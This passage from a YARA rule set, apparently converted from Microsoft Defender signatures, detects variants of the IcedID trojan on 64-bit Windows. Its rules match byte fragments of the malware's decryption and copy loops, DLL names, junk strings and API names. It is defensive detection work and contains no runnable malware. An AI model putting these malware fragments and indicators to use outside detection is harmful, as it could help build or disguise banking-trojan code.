        $x_5_1 = {48 8b 44 24 20 48 83 c4 18 eb f4 48 83 7c 24 30 00 74 ed 48 8b 04 24 eb 4b 88 08 48 8b 04 24 66 3b ff 74 4b 48 8b 44 24 28 48 89 44 24 08 eb db 48 89 4c 24 08 48 83 ec 18 3a ff 74 0c}  //weight: 5, accuracy: High
        $x_5_2 = "uifnyasfbjauinyugasjas" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MH_2147818867_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MH!MTB"
        threat_id = "2147818867"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tlmq257qt8.dll" ascii //weight: 1
        $x_1_2 = "ByUed741b" ascii //weight: 1
        $x_1_3 = "DTeT603rKR" ascii //weight: 1
        $x_1_4 = "Nfu44e" ascii //weight: 1
        $x_1_5 = "TIJlO61b" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MH_2147818867_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MH!MTB"
        threat_id = "2147818867"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {88 08 48 8b 04 24 66 3b ed 74 ?? 48 8b 44 24 08 48 ff c0 3a d2 74 ?? 48 ff c8 48 89 44 24 30 eb}  //weight: 5, accuracy: Low
        $x_5_2 = "uisbadyugausbdjasyudjas" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MH_2147818867_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MH!MTB"
        threat_id = "2147818867"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "QUqs2szkHhn" ascii //weight: 1
        $x_1_3 = "KKRAU.dll" ascii //weight: 1
        $x_1_4 = "rdRTaDIC" ascii //weight: 1
        $x_1_5 = "sgNkAYAvRL9" ascii //weight: 1
        $x_1_6 = "xWW5QM" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MI_2147819048_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MI!MTB"
        threat_id = "2147819048"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {4d 63 c2 4d 8d 5b 01 48 8b c7 41 ff c2 49 f7 e0 48 c1 ea ?? 48 6b ca ?? 4c 2b c1 42 0f b6 44 84 20 41 30 43 ff 41 81 fa ?? ?? ?? ?? 72 d2}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MI_2147819048_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MI!MTB"
        threat_id = "2147819048"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {48 8b 44 24 20 48 89 04 24 66 3b ed 74 ?? 88 08 48 8b 04 24 3a db 74 ?? 48 ff c0 48 89 04 24 66 3b d2 74}  //weight: 5, accuracy: Low
        $x_5_2 = "yughoiasdmiaosdnuasdjka" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MI_2147819048_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MI!MTB"
        threat_id = "2147819048"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "DBCzcH" ascii //weight: 1
        $x_1_3 = "NxRxs410" ascii //weight: 1
        $x_1_4 = "OvjGFExvddh" ascii //weight: 1
        $x_1_5 = "U7RmTAB3W5" ascii //weight: 1
        $x_1_6 = "IGNA.dll" ascii //weight: 1
        $x_1_7 = "qeUMnc.dll" ascii //weight: 1
        $x_1_8 = "EX3AL12lOI" ascii //weight: 1
        $x_1_9 = "IGlvRll5cn" ascii //weight: 1
        $x_1_10 = "Nkwm0q" ascii //weight: 1
        $x_1_11 = "YSoUhVAid1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MJ_2147819102_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MJ!MTB"
        threat_id = "2147819102"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {4c 2b c0 66 66 66 0f 1f 84 00 00 00 00 00 41 0f b6 0c 00 88 08 48 8d 40 01 83 ea 01 75}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MJ_2147819102_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MJ!MTB"
        threat_id = "2147819102"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "JMwq.dll" ascii //weight: 1
        $x_1_3 = "BLgSZnJGh" ascii //weight: 1
        $x_1_4 = "CKKOL6AYfb" ascii //weight: 1
        $x_1_5 = "WLsQbxK15" ascii //weight: 1
        $x_1_6 = "dKi3BTY8M3v" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MJ_2147819102_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MJ!MTB"
        threat_id = "2147819102"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "usiafnuyuasfbhsbfasjdjka" ascii //weight: 10
        $x_1_2 = "BBdZujbHhUhBAW" ascii //weight: 1
        $x_1_3 = "DpwEMMICZzmHprD" ascii //weight: 1
        $x_1_4 = "IbSKygAqSwgbFLw" ascii //weight: 1
        $x_1_5 = "VZPOajtblBLfc" ascii //weight: 1
        $x_1_6 = "ZtSRylwEZgKyVtZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_VN_2147819304_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.VN!MTB"
        threat_id = "2147819304"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {89 c8 f7 ea c1 fa 04 89 c8 c1 f8 1f 29 c2 89 d0 6b c0 36 29 c1 89 c8 48 98 4c 01 d0 0f b6 00 44 31 c8 41 88 00 83 85 9c ?? ?? ?? ?? 8b 85 ?? ?? ?? ?? 3b 85 84 0b}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ML_2147819389_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ML!MTB"
        threat_id = "2147819389"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {41 8b 06 83 c0 1e 48 98 0f b7 4c 45 00 48 81 c1 6f 04 00 00 4b 31 0c c7}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ML_2147819389_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ML!MTB"
        threat_id = "2147819389"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "RunObject" ascii //weight: 10
        $x_1_2 = "VMpBrK.dll" ascii //weight: 1
        $x_1_3 = "AMfFClGrXkY" ascii //weight: 1
        $x_1_4 = "BXobYvPFnqu" ascii //weight: 1
        $x_1_5 = "DNqrZsHVqf" ascii //weight: 1
        $x_1_6 = "PRorAsrSw" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ML_2147819389_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ML!MTB"
        threat_id = "2147819389"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 89 04 24 48 8b 44 24 08 eb 00 48 ff c0 48 89 44 24 08 eb d4 eb 47 48 89 4c 24 08 48 83 ec 28 eb 31 48 8b 44 24 40 48 ff c8 eb 40 8a 09 88 08 eb}  //weight: 5, accuracy: High
        $x_5_2 = {48 89 44 24 08 48 8b 44 24 30 eb 46 48 ff c0 48 89 04 24 eb 00 48 8b 44 24 08 48 ff c0 eb e1 48 89 4c 24 08 48 83 ec 18 eb 00 48 8b 44 24 20 48 89 04 24 eb 29 88 08 48 8b 04 24 eb}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_ML_2147819389_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ML!MTB"
        threat_id = "2147819389"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rrypto_aead_aes256gcm_abytes" ascii //weight: 1
        $x_1_2 = "rrypto_aead_aes256gcm_decrypt" ascii //weight: 1
        $x_1_3 = "rrypto_aead_aes256gcm_encrypt" ascii //weight: 1
        $x_1_4 = "rrypto_aead_aes256gcm_keybytes" ascii //weight: 1
        $x_1_5 = "rrypto_aead_aes256gcm_nsecbytes" ascii //weight: 1
        $x_1_6 = "rrypto_aead_chacha20poly1305_abytes" ascii //weight: 1
        $x_1_7 = "rrypto_aead_chacha20poly1305_decrypt" ascii //weight: 1
        $x_1_8 = "rrypto_auth_bytes" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MM_2147819465_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MM!MTB"
        threat_id = "2147819465"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 89 04 24 48 8b 44 24 08 eb 3b 48 8b 44 24 40 48 ff c8 eb 61 48 8b 04 24 48 8b 4c 24 08 eb 00 8a 09 88 08 eb 00 48 8b 04 24 48 ff c0 eb}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MM_2147819465_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MM!MTB"
        threat_id = "2147819465"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {99 c1 ea 1c 01 d0 83 e0 ?? 29 d0 48 98 4c 01 c8 0f b6 00 44 31 c0 88 01 83 85 6c 0b 00 00 ?? 8b 85 6c 0b 00 00 3b 85 54 0b 00 00 7c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MM_2147819465_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MM!MTB"
        threat_id = "2147819465"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 f7 ea 89 c8 c1 f8 ?? c1 fa 04 29 c2 89 c8 0f af d5 29 d0 48 63 d0 41 0f b6 14 10 41 32 14 0b 41 88 14 09 48 83 c1 01 48 81 f9 ?? ?? ?? ?? 75}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MM_2147819465_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MM!MTB"
        threat_id = "2147819465"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tIO_f_ssl" ascii //weight: 1
        $x_1_2 = "tIO_new_buffer_ssl_connect" ascii //weight: 1
        $x_1_3 = "tIO_ssl_copy_session_id" ascii //weight: 1
        $x_1_4 = "tIO_ssl_shutdown" ascii //weight: 1
        $x_1_5 = "tTLSv1_2_client_method" ascii //weight: 1
        $x_1_6 = "tEM_read_SSL_SESSION" ascii //weight: 1
        $x_1_7 = "tEM_write_bio_SSL_SESSION" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MN_2147819484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MN!MTB"
        threat_id = "2147819484"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f7 ea 8d 04 0a 89 c2 c1 fa 05 89 c8 c1 f8 1f 89 d3 29 c3 89 d8 6b c0 2d 89 ca 29 c2 89 d0 48 98 48 03 85 88 02 00 00 0f b6 00 44 31 c8 41 88 00 83 85 9c 02 00 00 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MN_2147819484_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MN!MTB"
        threat_id = "2147819484"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "giKCRO.dll" ascii //weight: 1
        $x_1_3 = "AiNBxBPDWD" ascii //weight: 1
        $x_1_4 = "AeFjixhl" ascii //weight: 1
        $x_1_5 = "WWsREJzj" ascii //weight: 1
        $x_1_6 = "CVOLXUDn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MN_2147819484_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MN!MTB"
        threat_id = "2147819484"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "hasunyfguasfjiuashyfajsufiak" ascii //weight: 10
        $x_10_2 = "cyusdbashbydgausjdkasduja" ascii //weight: 10
        $x_2_3 = "WaitForSingleObject" ascii //weight: 2
        $x_2_4 = "CreateEventW" ascii //weight: 2
        $x_2_5 = "VirtualAlloc" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_2_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MN_2147819484_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MN!MTB"
        threat_id = "2147819484"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tOVER_best_destroy" ascii //weight: 1
        $x_1_2 = "tOVER_best_finish" ascii //weight: 1
        $x_1_3 = "tOVER_checkTotalCompressedSize" ascii //weight: 1
        $x_1_4 = "tOVER_dictSelectionError" ascii //weight: 1
        $x_1_5 = "tOVER_selectDict" ascii //weight: 1
        $x_1_6 = "tOVER_warnOnSmallCorpus" ascii //weight: 1
        $x_1_7 = "tSE_buildCTable_raw" ascii //weight: 1
        $x_1_8 = "tSE_compress_usingCTable" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MO_2147819546_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MO!MTB"
        threat_id = "2147819546"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {49 8b d5 49 8b ce eb aa 30 41 ff 8b 47 18 eb 00 3b d8 72 0f}  //weight: 3, accuracy: High
        $x_1_2 = "vcab" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MO_2147819546_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MO!MTB"
        threat_id = "2147819546"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "NyG1O4.dll" ascii //weight: 1
        $x_1_2 = "awtughjdasu" ascii //weight: 1
        $x_1_3 = "CbFRSGDURp" ascii //weight: 1
        $x_1_4 = "DQMBCxrxgmK" ascii //weight: 1
        $x_1_5 = "WALvmvp" ascii //weight: 1
        $x_1_6 = "DFkHLMbb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MO_2147819546_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MO!MTB"
        threat_id = "2147819546"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "uhandahygstdgahuisjdjnsuays" ascii //weight: 10
        $x_2_2 = "WaitForSingleObject" ascii //weight: 2
        $x_2_3 = "CreateEventA" ascii //weight: 2
        $x_2_4 = "VirtualAlloc" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DH_2147819550_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DH!MTB"
        threat_id = "2147819550"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 8b 4c 24 ?? 66 3b db 74 ?? 33 c8 8b c1 3a ed 74 ?? 48 63 0c 24}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b 4c 24 ?? 8a 09 3a c9 74 ?? 48 ff c0 48 89 04 24 3a ed 74 ?? 48 ff c8 48 89 44 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DH_2147819550_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DH!MTB"
        threat_id = "2147819550"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "HiaF7O.dll" ascii //weight: 1
        $x_1_3 = "ANijhHDV" ascii //weight: 1
        $x_1_4 = "BVIjKMDU" ascii //weight: 1
        $x_1_5 = "CfZRQMOEKJ" ascii //weight: 1
        $x_1_6 = "DTTNWXHcpD" ascii //weight: 1
        $x_1_7 = "ZpGDSALcVn.dll" ascii //weight: 1
        $x_1_8 = "FdgTUWLMH" ascii //weight: 1
        $x_1_9 = "JknpjFtXw" ascii //weight: 1
        $x_1_10 = "MdwtmwqTaX" ascii //weight: 1
        $x_1_11 = "diTguxZyREU" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MP_2147819590_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MP!MTB"
        threat_id = "2147819590"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {0f af 56 68 05 24 c2 13 00 01 46 58 48 63 4e 6c 48 8b 86 a8 00 00 00 88 14 01 44 8b 86 e0 00 00 00 8b 96 bc 00 00 00 44 8b 9e 34 01 00 00 8b 9e 18 01 00 00 ff 46 6c 41 8d 48 ed 03 4e 78 09 4e 78 8b 4e 44 8b c1 33 86}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MP_2147819590_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MP!MTB"
        threat_id = "2147819590"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "tnsjuyagsdbhjngjifomajduahy" ascii //weight: 10
        $x_10_2 = "bhunnnnduahsdiojasdygajakss" ascii //weight: 10
        $x_2_3 = "VirtualAlloc" ascii //weight: 2
        $x_2_4 = "CreateEventA" ascii //weight: 2
        $x_2_5 = "WaitForSingleObject" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_2_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MP_2147819590_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MP!MTB"
        threat_id = "2147819590"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "35"
        strings_accuracy = "High"
    strings:
        $x_30_1 = "PluginInit" ascii //weight: 30
        $x_1_2 = "HiaF7O.dll" ascii //weight: 1
        $x_1_3 = "Pqusbrs" ascii //weight: 1
        $x_1_4 = "PyZDegW" ascii //weight: 1
        $x_1_5 = "WJquvfSEOY" ascii //weight: 1
        $x_1_6 = "WdRZsH" ascii //weight: 1
        $x_1_7 = "Kah6x65xQ.dll" ascii //weight: 1
        $x_1_8 = "CLrBvYfwHX" ascii //weight: 1
        $x_1_9 = "JkHYIdDssG" ascii //weight: 1
        $x_1_10 = "MlMbUOtIp" ascii //weight: 1
        $x_1_11 = "mAnMFqYDISJ" ascii //weight: 1
        $x_1_12 = "ZpGDSALcVn.dll" ascii //weight: 1
        $x_1_13 = "FdgTUWLMH" ascii //weight: 1
        $x_1_14 = "JknpjFtXw" ascii //weight: 1
        $x_1_15 = "MdwtmwqTaX" ascii //weight: 1
        $x_1_16 = "hWJMJQqt" ascii //weight: 1
        $x_1_17 = "EPnCOZOcPE.dll" ascii //weight: 1
        $x_1_18 = "pIqFQQorZEp" ascii //weight: 1
        $x_1_19 = "woymctzaTj" ascii //weight: 1
        $x_1_20 = "OJZSMANOuj" ascii //weight: 1
        $x_1_21 = "BmsEuwFs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_30_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_DI_2147819621_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DI!MTB"
        threat_id = "2147819621"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 c8 f7 ea 8d 04 0a c1 f8 ?? 89 c2 89 c8 c1 f8 1f 29 c2 89 d0 6b c0 ?? 29 c1 89 c8 48 98 4c 01 d0 0f b6 00 44 31 c8 41 88 00 83 85 ?? ?? ?? ?? 01 8b 85 ?? ?? ?? ?? 3b 85 ?? ?? ?? ?? 7c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DJ_2147819699_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DJ!MTB"
        threat_id = "2147819699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "33lN0m.dll" ascii //weight: 10
        $x_1_2 = "DjbrVoUySI" ascii //weight: 1
        $x_1_3 = "PRebrsQNOJm" ascii //weight: 1
        $x_1_4 = "WKoJptMuDDm" ascii //weight: 1
        $x_10_5 = "lCqBdez5vu.dll" ascii //weight: 10
        $x_1_6 = "BXdAixCmKS" ascii //weight: 1
        $x_1_7 = "ONolNoblqZ" ascii //weight: 1
        $x_1_8 = "PYDEknOmqN" ascii //weight: 1
        $x_10_9 = "GYsnGtsoCq.dll" ascii //weight: 10
        $x_1_10 = "LqIVAPoTZ" ascii //weight: 1
        $x_1_11 = "doFNHDCwsc" ascii //weight: 1
        $x_1_12 = "raibBPZspvX" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MQ_2147819701_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MQ!MTB"
        threat_id = "2147819701"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
